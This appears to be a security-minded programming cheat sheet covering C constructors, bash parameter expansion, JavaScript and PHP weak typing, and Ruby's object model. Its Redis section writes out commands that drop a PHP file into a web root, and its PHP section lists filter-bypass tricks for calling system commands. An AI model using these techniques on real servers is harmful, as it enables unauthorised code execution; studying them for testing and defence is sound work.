# Programming & Framework

## C
- .init / .fini

  ```C
  #include <stdio.h>
  __attribute__((constructor(101))) void func1() {
  }

  __attribute__((constructor(102))) void func2() {
  }

  __attribute__((constructor)) void func3() {
  }

  __attribute__((destructor)) void func4() { // Run after main function.
  }

  int main() {
    return 0;
  }
  ```

## Shell
- [Shell Parameter Expansion](https://www.gnu.org/software/bash/manual/html_node/Shell-Parameter-Expansion.html#Shell-Parameter-Expansion)
  | Parameter Expansion   | x="a1 b1 c2 d2" |
  |:----------------------|:----------------|
  | `${x#*1}`             | &nbsp; b1 c2 d2 |
  | `${x##*1}`            | &nbsp; c2 d2    |
  | `${x%1*}`             | a1 b            |
  | `${x%%1*}`            | a               |
  | `${x/1/3}`            | a3 b1 c2 d2     |
  | `${x//1/3}`           | a3 b3 c2 d2     |
  | `${x//?1/z3}`         | z3 z3 c2 d2     |
  | `${x:0:2}`            | a1              |
- Command
  - printf

    ```bash
    printf '%s.' a b c
    ------------------
    a.b.c.
    ```

## Redis
- Write file

  ```
  FLUSHALL
  SET payload "<?php phpinfo() ?>"
  CONFIG SET DIR /var/www/html/
  CONFIG SET DBFILENAME shell.php
  SAVE
  ```

- [RCE](https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf)

## JavaScript
- Reference
  - [wtfjs](https://github.com/denysdovhan/wtfjs)
  - [JavaScript Truth Table](https://thomas-yang.me/projects/oh-my-dear-js/)
  - [你懂 JavaScript 嗎？#8 強制轉型（Coercion）](https://ithelp.ithome.com.tw/articles/10201512)
- Weak Type (comparison `==`)
  - [] == 0
  - [] == "0"
  - ['a', ['b', 'c']] == "a,b,c"
  - "b" + "a" + + "a" + "a" == baNaNa
- Prototype Chain
  ```
  __proto__ 
  ─────────>
                                      
         ┌─────────────────────────────┐ ┌───────────────────────────────────────────────────┐
         │                             │ │                                                   │
         │                             │ │                                                   │
         │                             │ │                   ┌──────┐                        │
         │                             │ │                   │ null │                        │
         │                             │ │                   └──────┘                        │
         │                             │ │                      ↑                            │
         │                             ↓ ↓                      │                            │
  ┌────────────┐    prototype┌────────────────────┐    ┌──────────────────┐  constructor┌──────────┐
  │ Function() │─────────────│ Function.prototype │───>│ Object.prototype │─────────────│ Object() │
  └────────────┘constructor  └────────────────────┘    └──────────────────┘prototype    └──────────┘
                                        ↑                       ↑          
                                        │                       │
                                     ┌─────┐    prototype┌─────────────┐
                                     │ A() │─────────────│ A.prototype │
                                     └─────┘constructor  └─────────────┘
                                                                ↑          
                                                                │
                                                           ┌─────────┐
                                                           │ new A() │
                                                           └─────────┘
  ```

## PHP
- Reference
  - [php.net](https://www.php.net/)
- Weak Type (comparison `==`)
  - [PHP Truth Table](https://www.php.net/manual/en/types.comparisons.php)
  - [String to Number Comparison](https://www.php.net/manual/en/migration80.incompatible.php#migration80.incompatible.core.string-number-comparision)
  - `0eXXXX == 0eYYYY`
  - PHP Array
    - $arr[idx] <-> $arr{idx}
    - strcmp([], []) -> NULL
    - md5([]) -> NULL
    - sha1([ ]) -> NULL
    - strlen([ ]) -> NULL
    - file\_put\_contents("info.php", ["<?php ", "phpinfo();"]);
- Keyword Bypass
  - Case Insensitive
    - `<?php SySTeM("ls -al"); ?>`
  - Variable Function
    - `$func="system"; $func("ls -al");`
  - system(id) -> system("id")
  - echo \`id\` -> system("id")
- [Tags](https://www.php.net/manual/en/language.basic-syntax.phptags.php)
  - normal tag

    ```
    <?php echo 'test' ?>
    ```

  - short tag
    > can be disabled via the `short_open_tag` in `php.ini`, or are disabled
    > by default if PHP is built with the `--disable-short-tags` configuration

    ```php
    <? echo 'test' ?>
    ```

  - short echo tag

    ```php
    <?= 'test' ?>
    ```

## Python
- Reference
  - [wtfpython](https://github.com/satwikkansal/wtfpython) 

## Ruby
- Object Model
  ```
  superclass
  ──────────>

      ┌──────────────────────────────────────────────────────────┐
      │                                                          │
      │                       ┌─────┐                            │
      │                       │ nil │                            │
      │                       └─────┘                            │
      │                          ↑                               │
      │                          │                               │
      │                   ┌─────────────┐  singleton_class┌──────────────┐ 
      │                   │ BasicObject │─────────────────│ #BasicObject │
      │                   └─────────────┘                 └──────────────┘
      │                          ↑                               ↑
      ↓                          │                               │
  ┌───────┐    ┌────────┐    ┌────────┐      singleton_class┌─────────┐
  │ Class │───>│ Module │───>│ Object │─────────────────────│ #Object │
  └───────┘    └────────┘    └────────┘                     └─────────┘
                                 ↑                               ↑ 
                                 │                               │
                          class┌───┐            singleton_class┌────┐
          ┌────────────────────│ A │───────────────────────────│ #A │
          │                    └───┘                           └────┘
          │                      ↑  
          │                      │  
        ┌───┐   singleton_class┌────┐
        │ a │──────────────────│ #a │
        └───┘                  └────┘

  ```
